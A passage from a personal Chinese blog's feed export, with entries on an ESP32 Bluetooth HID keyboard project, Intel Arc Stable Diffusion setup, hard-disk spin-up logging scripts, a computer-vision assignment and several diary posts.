      <category>技术备忘</category>
      
      <category>网络</category>
      
    </categories>
    
    
    <tags>
      
      <tag>网络</tag>
      
      <tag>备忘</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>再挖掘HID和硬件工程</title>
    <link href="/hid/HID_secondDig/"/>
    <url>/hid/HID_secondDig/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>你喜欢的那个总挖坑不填的博主回来啦(～￣▽￣)～</p><p>在<a href="https://blog.zhaosn.top/2022/HID_firstDig/">之前的HID博客</a>发布3.753425年之后，我又断断续续研究了3个月HID。现在汇报一下当前进度daze(=•ω＜=)ρ⌒☆</p><h1 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h1><p>在外出差的日子通关了药剂工艺，GTASA也打不动了。研究了一段时间我的ThinkPad X1Carbon gen VI跑kali能不能实现模仿成蓝牙键盘。事实证明SDP、blueDucky啥的都是天坑，要从内核啥的做出修改，代码既不直观也没有可行的demo。挣扎后我绝望的花40左右买了块esp32开发板，随后吃灰了一个多月。</p><p>后来借蓝牙键盘抓包，再意识到不靠外部硬件只靠电脑很难迁移，就掏出了esp32。某个周天一天就下载下来店家的资料，搞懂刷新底层系统、microPython、比较Arduino和PlatformIO发现都依赖开源开发者适配且依赖早期esp-idf的官方版本。选择了esp-idf原生开发，当天晚上就通过找到的官方bleHID示例实现了STRING输入demo。</p><p>但后来两三周在脚本解释上进度缓慢。现在选择的方式就是顺序读取命令，识别后读取参数。从最开始的面向单片机开发改为先在电脑上写出demo。将VSCode配置为了C语言IDE，单步调试断点等很方便（不要用TRAE这种第三方VSCode，他们架构不一样，这是一道弯路）。</p><p>现在STRING、STRINGLN、及其代码块、忽略缩进写的不错。但更多命令的代码维护、分支、函数还是很复杂的。本次与TRAE的合作顺利很多，我也感悟到分模块实现功能的可贵，但要想完全复刻DuckyScript3.0语法，我认为现在距离引起质变还有不明朗但依旧够长的一段距离。</p><h1 id="感悟"><a href="#感悟" class="headerlink" title="感悟"></a>感悟</h1><p>顺利的开发让人心情好，有继续的动力。i’m lovin’ it♪(^∇^*)</p>]]></content>
    
    
    <categories>
      
      <category>技术备忘</category>
      
      <category>嵌入式</category>
      
    </categories>
    
    
    <tags>
      
      <tag>杂谈</tag>
      
      <tag>HID</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>25年10月生活总结</title>
    <link href="/diary/2025annual_review/"/>
    <url>/diary/2025annual_review/</url>
    
    <content type="html"><![CDATA[<p>开眼看过世界，也脚踏实地存了一些资金。虽然回家的工作远远够不到梦想，好在家里的日常与我能够密切相关。初夏去了咸阳大秦音乐节，看了马飞、岛屿心情、南青、万能青年旅店的现场，很长一段时间，我躁动的摇滚心脏都能被安抚了。</p><p>从临毕业有点难过的心情过来，现在也逐渐认清什么是生活，从多少年都不能财务自由的假想敌中走出，看到5w块钱放到每月2k的生活费下够花2年，简单的算数+实际的存款=没那么焦虑了。</p><p>并没有急迫的生存压力，也认识到自己技能的丰富和优异，认清真正的主线后，感觉能放心的探索支线任务了。<br>我想说点涩话，就是最近我想到了我为什么想回家，就是与认识的环境继续做个适应，家永远都在，但是朋友和家人会逐渐减少，大学里每个学期开学我都会隐约存在分离焦虑，刚毕业能回家先工作是幸运的，况且我的这个选择能够在刚工作最窘迫的阶段做个缓冲。<br>享受未来和现在，不苛责过去的自己。就能增长生命的厚度。</p><div id="music_div" class="music"><iframe src="//player.bilibili.com/player.html?bvid=BV1GMjKzFEEL" scrolling="no" border="0" frameborder="no" framespacing="0" muted="0" allowfullscreen="true"></iframe></div><style>    iframe[src*='player.bilibili.com'] {    width: 100%;  /* 设置视频的宽度 */    height: 400px; /* 设置视频的高度 */    }</style><a href="/diary/whatRecentlyMay3/" title="whatRecentlyMay3">whatRecentlyMay3</a>]]></content>
    
    
    <categories>
      
      <category>日常</category>
      
      <category>个人总结</category>
      
    </categories>
    
    
    <tags>
      
      <tag>杂谈</tag>
      
      <tag>个人总结</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>B580使用秋葉aaakiSD-Forge开启SD画图加速的方法</title>
    <link href="/SD-B580FULLPOWAH/"/>
    <url>/SD-B580FULLPOWAH/</url>
    
    <content type="html"><![CDATA[<h1 id="版本"><a href="#版本" class="headerlink" title="版本"></a>版本</h1><p>显卡Arc B580，启动器版本绘世2.8.13</p><h1 id="VAE时非常慢（卡到95-）的解决办法"><a href="#VAE时非常慢（卡到95-）的解决办法" class="headerlink" title="VAE时非常慢（卡到95%）的解决办法"></a>VAE时非常慢（卡到95%）的解决办法</h1><p><code>[Unload]</code> 里面显示了每次绘图的模型占的显存，之前用的AOM3比较小只有1G，后来换成影构师就会卡到95%。这是因为留给VAE的显存不够，需要跑个GC之类的，修复方式：12G的显存，我试了感觉 <code>GPU Weights</code> 开到5500MB可以，然后在<code>UI defaults &#39;xl&#39;</code>设置默认值<br><img src="https://pic1.imgdb.cn/item/6971f6692d08d4bddaa6dcab.png"></p><h1 id="开启DML"><a href="#开启DML" class="headerlink" title="开启DML"></a>开启DML</h1><ol><li><p>B站我自己，里面放了图片<sup id="fnref:1" class="footnote-ref"><a href="#fn:1" rel="footnote"><span class="hint--top hint--rounded" aria-label="https://www.bilibili.com/opus/1116551395134144550">[1]</span></a></sup></p></li><li><p>IPEX官网<sup id="fnref:2" class="footnote-ref"><a href="#fn:2" rel="footnote"><span class="hint--top hint--rounded" aria-label="https://github.com/intel/intel-extension-for-pytorch">[2]</span></a></sup></p></li></ol><p>(PS, 这玩意儿是Intel Extension for PyTorch的缩写？不如说是Intel PyTorch Extension的缩写○( ＾皿＾)っ)</p><p>(PPS, 根据<sup id="fnref:2" class="footnote-ref"><a href="#fn:2" rel="footnote"><span class="hint--top hint--rounded" aria-label="https://github.com/intel/intel-extension-for-pytorch">[2]</span></a></sup>的GPU里的<a href="https://intel.github.io/intel-extension-for-pytorch/index.html#installation?platform=gpu">🏃Installation</a>生成安装代码，可以看B站的图片)</p><ol start="3"><li><p>步骤1：启动器选择IPEX（Intel Extension for PyTorch）</p></li><li><p>步骤2：点击“启动命令提示符”（一键启动左边）</p></li><li><p>步骤3：执行官方指南的命令（根据Torch版本不同，请自行到官网复制）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">python -m pip install torch==2.7.0 torchvision==0.22.0 torchaudio==2.7.0 --index-url https://download.pytorch.org/whl/xpu<br><br>python -m pip install intel-extension-for-pytorch==2.7.10+xpu --extra-index-url https://pytorch-extension.intel.com/release-whl/stable/xpu/us/<br></code></pre></td></tr></table></figure></li><li><p>步骤4：点击一键启动，等</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs cmd">我这块出现了<br><span class="hljs-function"></span><br><span class="hljs-function">RuntimeError: <span class="hljs-title">Failed</span> <span class="hljs-title">to</span> <span class="hljs-title">import</span> <span class="hljs-title">diffusers.loaders.lora_pipeline</span> <span class="hljs-title">because</span> <span class="hljs-title">of</span> <span class="hljs-title">the</span> <span class="hljs-title">following</span> <span class="hljs-title">error</span>:</span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">No</span> <span class="hljs-title">module</span> <span class="hljs-title">named</span> &#x27;<span class="hljs-title">triton.ops</span>&#x27;</span><br></code></pre></td></tr></table></figure></li><li><p>步骤5：禁用调用CUDA的triton模块(好像是bitsandbytes啥的，多亏kimi，工作上一直用的豆包在专业问题上日常很der)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">1.打开文件:</span><br><span class="hljs-string">F:\sd-webui-forge-aki-v1.0\python\Lib\site-packages\bitsandbytes\__init__.py</span><br><span class="hljs-string">2.在文件顶部添加以下代码，强制跳过 Triton 加载:</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-keyword">import</span> sys<br>sys.modules[<span class="hljs-string">&#x27;triton&#x27;</span>] = <span class="hljs-literal">None</span><br>sys.modules[<span class="hljs-string">&#x27;triton.ops&#x27;</span>] = <span class="hljs-literal">None</span><br></code></pre></td></tr></table></figure><p><img src="https://pic1.imgdb.cn/item/6971f33c2d08d4bddaa6dbe1.png" alt="优化结果"></p></li><li><p>喜提6it/s的速度，比之前DML的1.3it/s不知道高到哪里去了</p></li></ol><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><section class="footnotes"><div class="footnote-list"><ol><li><span id="fn:1" class="footnote-text"><span><a href="https://www.bilibili.com/opus/1116551395134144550">https://www.bilibili.com/opus/1116551395134144550</a><a href="#fnref:1" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:2" class="footnote-text"><span><a href="https://github.com/intel/intel-extension-for-pytorch">https://github.com/intel/intel-extension-for-pytorch</a><a href="#fnref:2" rev="footnote" class="footnote-backref"> ↩</a></span></span></li></ol></div></section>]]></content>
    
    
    <categories>
      
      <category>技术备忘</category>
      
      <category>计算机图形学</category>
      
    </categories>
    
    
    <tags>
      
      <tag>计算机图形学</tag>
      
      <tag>备忘</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>11月1号下班游记</title>
    <link href="/diary/OneDayDeRail/"/>
    <url>/diary/OneDayDeRail/</url>
    
    <content type="html"><![CDATA[<h1 id="起源"><a href="#起源" class="headerlink" title="起源"></a>起源</h1><p>下班突发奇想去美团上所谓“宾喜炸鸡xx首店”的商家地址看看。<br>到地方像个城中村，其实那里里市内最热闹的万达等商场聚集区很近。</p><h1 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h1><h2 id="交流摩托"><a href="#交流摩托" class="headerlink" title="交流摩托"></a>交流摩托</h2><p>摩托在人行道上停下，步行逛了一圈没看到什么店面，看到一个嘉陵弯梁110在等人，问他车在哪买的，答城东汽配城；问多少钱，答买车带上牌五千；问多少公里了，车还这么新，答一万公里不到，问保养周期他说每500换机油，我说我250换了打算两千再换；他说打算把车卖了，我问为什么，答平常开车没地方放，我说平常我就开到地下停车场，他也没回复啥；问油耗，他说20元能往返湟中两趟（约120km，合0.16￥/km)，我说我的125总里程还2000km不到（现一千三百多）油耗有时0.3￥/km，他说磨合比较重要，然后就是说什么机油里因为磨合会看到铁屑的事。我买车时送的两次保养因为我换地方了，所以换成了两瓶机油，还得自己想办法换了，现在偷懒一直没换。</p><h2 id="主线：探店外卖"><a href="#主线：探店外卖" class="headerlink" title="主线：探店外卖"></a>主线：探店外卖</h2><p>因为带着头盔还没摘，过来一个美团小哥（大概年龄靠近22岁）问我附近哪有这个店。（我那时发现自己来的理由有点好笑，人家是为了挣钱，我比较起来就是闲得）我被突如其来的问题整得有点懵，和他说我不是送外卖的，也是来找这个店，这个回复真是怪，一是就好像送外卖怎么了似的，二是我这动机自己听起来也无语。他刚好和店家电话也打通了，我隐隐约约能听到店家那边的对话，边说着我边跟着看他在路口拐弯越走越远。</p><p>我发动了车子往上开到那个巷子里，巷子里氛围很像<strong>“天注定”</strong>那个电影里有蛇女跳舞的那个巷子（水泥的地面和旁边水泥的一层店铺二层卧房的小楼带来的感觉）。尽头有个小卖店，</p><p>有个外卖老哥（看上去约50岁）在那抽烟，我问他那个店怎么找，他帮我指了路，我自从自己出门起都是看的导航来找路，这样子在人生地不熟的地方问一个去自己不知道去了干嘛的目的地的路，氛围真有点诡异。</p><p>他问我有单子没，面对行话我还是有点露怯，我说还没有送过，今天只是想探探路，他审视我几眼。我也是个现场的怪人，踏板摩托和电动车有区别；头盔有区别；制服有区别。他说我什么时候打算开始送，我只好说我不知道。虽然我自以为自己没有钱，但现在有个社会评价体系中更体面的工作，我没有不尊重和傲慢的意思，但我想起了<strong>黑暗骑士崛起</strong>里的监狱桥段，如果有一天被折断了脊椎丢到这种场景下，我应该就很难爬出去了——心态和意志不够。</p><p>骑车到了那，发现原来刚才步行跟着外卖员的方向就是到了那家店门口，和美团上的光鲜亮丽截然不同：没有任何装修、上面用广告的那种塑料布贴的店名丝毫无关、往里偷偷望去就好像<strong>赛博朋克：边缘行者</strong>里治死大卫他妈的医院，柜台上放着一堆从前在学校总见过的炸鸡的外卖袋，没敢往里面走，偷偷照了个相，就好像做贼似地，脑中闪过那种一回头发现同伙在身后导致突然开始缠斗的桥段，不过都没有。黑咕隆咚的地方我发动车转头走了，下次应该把之前买的NITECORE P20i揣上，天黑的早的时候这个是一个防身好选择，至少心里会更有安全感。</p><h2 id="支线：狭路相逢"><a href="#支线：狭路相逢" class="headerlink" title="支线：狭路相逢"></a>支线：狭路相逢</h2><p>往外出的时候和一个外卖员在闸杆边上面对面上了，状态就是你往左我往右的那种，最后我不自觉的多拧了一些，可能算是比较强势的让他退了退。</p><p>后来想想，在现在，如何判断一个人是不是讲理的人呢？如果人衣食无忧，开车走在路上或平常相见，并没有产生矛盾后将事情闹大的好处；但是如果人为生计奔波到没有什么退路，或因为某些暴力事件和因素潜移默化的影响导致讲不了道理，又有什么办法在当场保护自己呢？就如路怒来说，如果我没开着四轮的话，安全的最后一道防线是不达标的。但平衡用车成本和停车成本，现在我骑摩托又是比较好的，平衡风险和成本的这笔帐我是算不清的。</p><h2 id="支线：败家子的内疚"><a href="#支线：败家子的内疚" class="headerlink" title="支线：败家子的内疚"></a>支线：败家子的内疚</h2><p>我买摩托加上牌保险考驾照，当时还有黄牛办暂住证，加上换地方发展把车寄回家花了得一万三了。我虽然没另外向家里要钱，但说真的这些钱都是家里打得，我买车时只挣过两个月实习工资，算上我买了600块钱的手机、900的平板、3000的游戏本跌价，实习工资可以说已经花完了。将心比心的说，我自从开始掌握钱以后就再也不是理性消费的人了，为了自己想要而第一时间花钱买，虽然快乐了，但钱也没了，花到服务和业余教育上的两千+六千，如果我还不学那就真的是打水漂了。</p><h2 id="陌生人与怪咖：真人GalGame"><a href="#陌生人与怪咖：真人GalGame" class="headerlink" title="陌生人与怪咖：真人GalGame"></a>陌生人与怪咖：真人GalGame</h2><p>上周慕柚子社大名下载了<strong>魔女的夜宴</strong>和<strong>千恋万花</strong>，因幡巡线是第一次乱选的单身结局后第一个自然走上的线，从打打闹闹到开始煮饭之间还是比较喜欢打打闹闹，后面煮饭就没什么代入感了。互相猜来猜去那块儿心里也酸酸的，类似看<strong>“龙与虎”</strong>的感觉。每次工作上、生活上不提还好，一提到伴侣相关的事自己就会陷入某种思考：</p><blockquote><p>有伴的人是怎么认识的🤨、有了伴之后怎么发展关系❤️‍、关系到了一定程度怎么维持热情🔥。</p></blockquote><p>现在我还在第一步，不过从现在我对身边的观察来看好像后两步也很难走。我之前情窦初开的时候尝试走过两次第一步，都是没迈开腿。后来也有过一见动心小鹿乱撞般的冲动，都忍住了没去打扰。<br>现在更是现实了，</p><blockquote><p>首先没场景能认识人x、没人有时间随时见面粘在一起、没人满足之前两点还有相似爱好且是异性、自己不是财富自由、自己工作还不稳定、自己没个地方可以邀请人来开party、自己不擅长安排出门玩</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>日常</category>
      
      <category>杂谈</category>
      
    </categories>
    
    
    <tags>
      
      <tag>杂谈</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>添加B站外部播放器示例，以及我换了呼号BG9SHY</title>
    <link href="/blog/bili-embed/"/>
    <url>/blog/bili-embed/</url>
    
    <content type="html"><![CDATA[<div id="music_div" class="music"><iframe src="//player.bilibili.com/player.html?bvid=BV1Ax411J7cT" scrolling="no" border="0" frameborder="no" framespacing="0" muted="0" allowfullscreen="true"></iframe></div><style>    iframe[src*='player.bilibili.com'] {    width: 100%;  /* 设置视频的宽度 */    height: 400px; /* 设置视频的高度 */    }</style><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;music_div&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;music&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;//player.bilibili.com/player.html?bvid=BV1Ax411J7cT&quot;</span> <span class="hljs-attr">scrolling</span>=<span class="hljs-string">&quot;no&quot;</span> <span class="hljs-attr">border</span>=<span class="hljs-string">&quot;0&quot;</span> <span class="hljs-attr">frameborder</span>=<span class="hljs-string">&quot;no&quot;</span> <span class="hljs-attr">framespacing</span>=<span class="hljs-string">&quot;0&quot;</span> <span class="hljs-attr">muted</span>=<span class="hljs-string">&quot;0&quot;</span> <span class="hljs-attr">allowfullscreen</span>=<span class="hljs-string">&quot;true&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="css"></span><br><span class="css"><span class="hljs-selector-tag">iframe</span><span class="hljs-selector-attr">[src*=<span class="hljs-string">&#x27;player.bilibili.com&#x27;</span>]</span> &#123;</span><br><span class="css">    <span class="hljs-attribute">width</span>: <span class="hljs-number">100%</span>;  <span class="hljs-comment">/* 设置视频的宽度 */</span></span><br><span class="css">    <span class="hljs-attribute">height</span>: <span class="hljs-number">666px</span>; <span class="hljs-comment">/* 设置视频的高度 */</span></span><br><span class="css">    &#125;</span><br><span class="css"></span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>技术备忘</category>
      
      <category>博客</category>
      
    </categories>
    
    
    <tags>
      
      <tag>杂谈</tag>
      
      <tag>博客</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>为什么我的机械硬盘总会自动起转</title>
    <link href="/whatUseMyDisk/"/>
    <url>/whatUseMyDisk/</url>
    
    <content type="html"><![CDATA[<h1 id="现状"><a href="#现状" class="headerlink" title="现状"></a>现状</h1><p>几百块买了个J1900主板，搭配上家里最早电脑的最早的DDR3内存条，本来初中时加了根内存条干到4G内存了，但是新的二十多块的淘宝内存条坏了导致不开机，尽管在老电脑上工作正常😮‍💨。这个电脑自买来刷上UbuntuServer就基本没关过，里面系统装在我买的一个二手固态硬盘上，那个固态硬盘金手指上是开有两个槽的，好像不是m.2接口，转接成SATA接口的盒子金手指上塑料也断了，反之接上还能用。机械硬盘是淘宝上买的50块钱500g那种，这种小机械硬盘投入小，不行了就拆来当摆件。每次我用hdparm -Y让硬盘停转之后过一阵子又会自启，可能和种子下载、jellyfin、smb有关，我每次发现时硬盘都自动转了数十天了。今天有空就让AI（讯飞星火）帮忙写了个脚本。</p><h1 id="失败的其中一次尝试"><a href="#失败的其中一次尝试" class="headerlink" title="失败的其中一次尝试"></a>失败的其中一次尝试</h1><h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>sudo hdparm -C /dev/sdb的输出是：</p><p>/dev/sdb:<br> drive state is:  active/idle<br>或者：</p><p>/dev/sdb:<br> drive state is:  standby<br>请注意这个输出前有一个空行<br>我需要一个在ubuntu系统下每两分钟自动执行的脚本，你可以分为一个脚本和我需要添加的sudo crontab中的一行<br>我希望在检测到 drive state is:  standby转化为 drive state is:  active/idle时在/home/zhaosn/disk.csv文件中添加一行，其由：<br>echo <code>TZ=UTC-8 date  +&quot;%Y/%m/%d %H:%M:%S, %s, %z, &quot;</code>的输出结果和sudo lsof /mnt/hdd的输出结果组合而来</p><h2 id="回复"><a href="#回复" class="headerlink" title="回复"></a>回复</h2><p>首先，我们需要创建一个脚本来检测硬盘状态并执行相应的操作。以下是脚本的内容：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><br>STATE=$(sudo hdparm -C /dev/sdb | grep <span class="hljs-string">&quot;drive state is&quot;</span> | awk <span class="hljs-string">&#x27;&#123;print $3&#125;&#x27;</span>)<br><span class="hljs-keyword">if</span> [ <span class="hljs-string">&quot;<span class="hljs-variable">$STATE</span>&quot;</span> == <span class="hljs-string">&quot;active/idle&quot;</span> ]; <span class="hljs-keyword">then</span><br>    <span class="hljs-built_in">echo</span> `TZ=UTC-8 date +<span class="hljs-string">&quot;%Y/%m/%d %H:%M:%S, %s, %z, &quot;</span>`$(sudo lsof /mnt/hdd) &gt;&gt; /home/zhaosn/disk.csv<br><span class="hljs-keyword">fi</span><br></code></pre></td></tr></table></figure><p>将以上内容保存为一个名为<code>check_disk_state.sh</code>的文件。接下来，我们需要为这个脚本添加可执行权限：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">chmod +x check_disk_state.sh<br></code></pre></td></tr></table></figure><p>最后，我们需要将这个脚本添加到crontab中以便每两分钟自动执行一次。请运行以下命令以编辑crontab：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">crontab -e<br></code></pre></td></tr></table></figure><p>在打开的编辑器中，添加以下一行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">*/2 * * * * /path/to/check_disk_state.sh<br></code></pre></td></tr></table></figure><p>请将<code>/path/to/</code>替换为<code>check_disk_state.sh</code>文件的实际路径。保存并退出编辑器。现在，脚本将在每两分钟自动执行一次，并在检测到硬盘状态从standby变为active/idle时将相关信息追加到<code>/home/zhaosn/disk.csv</code>文件中。</p><p>其实这个表现不好，如果我用ls访问硬盘，lsof是看不到的</p><h1 id="换种思路"><a href="#换种思路" class="headerlink" title="换种思路"></a>换种思路</h1><h2 id="问题-1"><a href="#问题-1" class="headerlink" title="问题"></a>问题</h2><p>我想在sudo lsof /mnt/hdd执行结果不为空时在/home/zhaosn/disk.csv文件中添加一行，其由：</p><p>echo <code>TZ=UTC-8 date  +&quot;%Y/%m/%d %H:%M:%S, %s, %z, &quot;</code>的输出结果和sudo lsof /mnt/hdd的输出结果组合而来。设置脚本需要root用户身份运行</p><h2 id="回复-1"><a href="#回复-1" class="headerlink" title="回复"></a>回复</h2><p>你可以使用以下脚本来实现你的需求：</p><ol><li>创建一个名为<code>check_disk_state.sh</code>的文件，并将以下内容复制到该文件中：</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><span class="hljs-built_in">set</span> -e<br><span class="hljs-keyword">if</span> [[ <span class="hljs-variable">$EUID</span> -ne 0 ]]; <span class="hljs-keyword">then</span><br>   <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;This script must be run as root&quot;</span> 1&gt;&amp;2<br>   <span class="hljs-built_in">exit</span> 1<br><span class="hljs-keyword">fi</span><br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">true</span>; <span class="hljs-keyword">do</span><br>    LSOF=$(sudo lsof /mnt/hdd)<br>    <span class="hljs-keyword">if</span> [ -n <span class="hljs-string">&quot;<span class="hljs-variable">$LSOF</span>&quot;</span> ]; <span class="hljs-keyword">then</span><br>        <span class="hljs-built_in">echo</span> `TZ=UTC-8 date +<span class="hljs-string">&quot;%Y/%m/%d %H:%M:%S, %s, %z, &quot;</span>`<span class="hljs-variable">$LSOF</span> &gt;&gt; /home/zhaosn/disk.csv<br>    <span class="hljs-keyword">fi</span><br>    sleep 60<br><span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure><ol start="2"><li><p>保存并关闭文件。</p></li><li><p>为脚本添加可执行权限：</p></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">chmod +x check_disk_state.sh<br></code></pre></td></tr></table></figure><ol start="4"><li>以root用户身份运行脚本：</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo ./check_disk_state.sh<br></code></pre></td></tr></table></figure><p>这个脚本会持续监控<code>/mnt/hdd</code>目录的<code>lsof</code>结果，如果结果不为空，则在<code>/home/zhaosn/disk.csv</code>文件中添加一行，该行由<code>echo TZ=UTC-8 date +&quot;%Y/%m/%d %H:%M:%S, %s, %z, &quot;</code>的输出结果和<code>sudo lsof /mnt/hdd</code>的输出结果组合而成。同时，脚本会每隔60秒检查一次。</p>]]></content>
    
    
    <categories>
      
      <category>技术备忘</category>
      
      <category>Linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>计算机视觉第一次大作业</title>
    <link href="/cannyOnN3350/"/>
    <url>/cannyOnN3350/</url>
    
    <content type="html"><![CDATA[<h1 id="信息挖掘"><a href="#信息挖掘" class="headerlink" title="信息挖掘"></a>信息挖掘</h1><p>找到个将canny性能优化的示例代码，好像是用到多线程<sup id="fnref:1" class="footnote-ref"><a href="#fn:1" rel="footnote"><span class="hint--top hint--rounded" aria-label="https://www.codee.com/case-study-how-we-made-canny-edge-detector-algorithm-run-faster-part-2">[1]</span></a></sup><sup id="fnref:2" class="footnote-ref"><a href="#fn:2" rel="footnote"><span class="hint--top hint--rounded" aria-label="https://github.com/teamappentra/blog-codes/tree/main/canny-performance-part1">[2]</span></a></sup><br>Hough就没那么容易了，虽然知道大概原理但不知道代码怎么实现，真是很悲哀啊<br>还要通过比较两个图片里最大圆所处的坐标计算变换矩阵，hough做不出来没拿到坐标</p><h1 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h1><p>先用提供的脚本编译了两个程序，跑了下发现可以用，直接将输入的pgm图片的路径改为bmp图像不行，使用在线转换工具转换后利用原始参数跑了一遍，效果不错。<br>参数都是什么作用原文档没有直接写，通读一遍代码发现有这种描述</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs text">float sigma,              /* Standard deviation of the gaussian kernel. */<br>      tlow,                 /* Fraction of the high threshold in hysteresis. */<br>      thigh;                /* High hysteresis threshold control. The actual<br>                               threshold is the (100 * thigh) percentage point<br>                               in the histogram of the magnitude of the<br>                               gradient image that passes non-maximal<br>                               suppression. */<br></code></pre></td></tr></table></figure><p>翻译一下：sigma：高斯核的标准偏差；tlow：迟滞的高阈值分数(?_?这个不知道是什么)；thigh：高滞后阈值控制。实际阈值是通过非极大值抑制(non-maximal suppression)的梯度图像(gradient image)的幅值直方图(histogram of the magnitude)中的(100 * thigh)个百分点。当参数调节为10.0；0.85、0.95时出现了较好的结果，噪声的边缘相比参考点的边缘小了很多。</p><p>现在尝试Hough圆检测，有大量的博客只简单介绍一下原理之后就调库，更让人鄙视的是一个原理抄的哪里都一样，有本事抄代码好好讲讲啊。后来找到一个练习者的博客里移植了更底层的代码<sup id="fnref:3" class="footnote-ref"><a href="#fn:3" rel="footnote"><span class="hint--top hint--rounded" aria-label="https://github.com/JoshuaQYH/CV-code">[3]</span></a></sup>，但由于使用了C++的类和CImg.h头文件，迁移可能需要更多时间深入学习。</p><h1 id="题外话"><a href="#题外话" class="headerlink" title="题外话"></a>题外话</h1><p>我在主力机上安装了eclipse以期代替vs——我想尝试用开源或开放的方案处理各种计算机上的工作，因为拼多多微信学习通等国产软件各都有过：利用0day漏洞提权、扫描用户浏览记录、泄漏平台所有用户帐密的窒息操作。虽然我手机上照用不误，但电脑上有选择我便采用如下方案：Blender、LibreCAD、Libreoffice、eclipse、GIMP，涵盖了剪视频、建模、画图纸等等操作，传文件用localsend传到手机再用微信反之亦然，能用邮箱用邮箱。然后一开始查找范例用的是这个n3350的电脑，不想复制太多数据，就挑战用这个破ubuntu电脑整全流程。</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><section class="footnotes"><div class="footnote-list"><ol><li><span id="fn:1" class="footnote-text"><span><a href="https://www.codee.com/case-study-how-we-made-canny-edge-detector-algorithm-run-faster-part-2">https://www.codee.com/case-study-how-we-made-canny-edge-detector-algorithm-run-faster-part-2</a><a href="#fnref:1" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:2" class="footnote-text"><span><a href="https://github.com/teamappentra/blog-codes/tree/main/canny-performance-part1">https://github.com/teamappentra/blog-codes/tree/main/canny-performance-part1</a><a href="#fnref:2" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:3" class="footnote-text"><span><a 